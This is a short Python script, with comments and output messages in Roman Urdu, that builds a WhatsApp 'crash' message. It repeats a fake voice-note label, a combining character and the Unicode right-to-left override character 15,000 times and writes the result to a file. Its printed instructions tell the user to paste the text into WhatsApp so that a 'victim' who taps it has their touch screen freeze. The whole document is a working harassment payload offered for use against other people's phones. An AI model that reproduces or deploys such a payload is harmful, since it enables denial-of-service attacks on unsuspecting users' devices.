import os

def voice_crash_only():
    print("="*40)
    print("   MEHDI BHAI VOICE-ONLY HANGER   ")
    print("="*40)
    
    # 1. Voice Note ka illusion + Unicode RTL Crash Logic
    # Ye symbols media player ko 'render' karte waqt jam kar dete hain
    crash_name = "Voice_Note_6min.txt"
    design = "🔈 [Voice Message 06:00]"
    # Ye characters processor ko 6 min tak busy rakhenge
    payload = (design + " ҉ " + "\u202e" + "Ilove_YouW") * 15000 
    
    with open(crash_name, "w", encoding="utf-8") as f:
        f.write(payload)
    
    print(f"[+] Done! '{crash_name}' ban gayi hai.")
    print("[!] Is file ka sara text copy karke WhatsApp par bhej dein.")
    print("[!] Victim jaise hi isay 'Play' karne ke liye click karega, uska touch freeze ho jayega.")

voice_crash_only()
